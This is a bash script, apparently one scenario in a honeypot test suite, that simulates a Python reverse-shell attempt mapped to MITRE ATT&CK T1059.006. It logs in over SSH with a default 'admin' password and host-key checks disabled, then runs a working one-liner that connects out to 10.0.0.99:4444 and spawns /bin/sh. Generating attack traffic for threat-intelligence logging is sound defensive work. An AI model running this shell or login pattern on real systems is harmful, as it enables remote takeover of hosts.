#!/usr/bin/env bash
# S26 — Python Reverse Shell Attempt
# Tactic : Execution (TA0002)
# Technique: T1059.006 Command and Scripting Interpreter: Python
# Note: network is isolated; the connection attempt will fail/timeout — the command
#       itself is what gets logged as CTI, not a successful reverse shell.
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S26 Python Reverse Shell Attempt — ${TARGET} ==="
$SSH "python3 -c \"import socket,os,pty;s=socket.socket();s.settimeout(3);s.connect(('10.0.0.99',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\" 2>&1 || echo 'connection failed (expected in isolated lab)'" && echo "[OK]" || echo "[FAIL]"
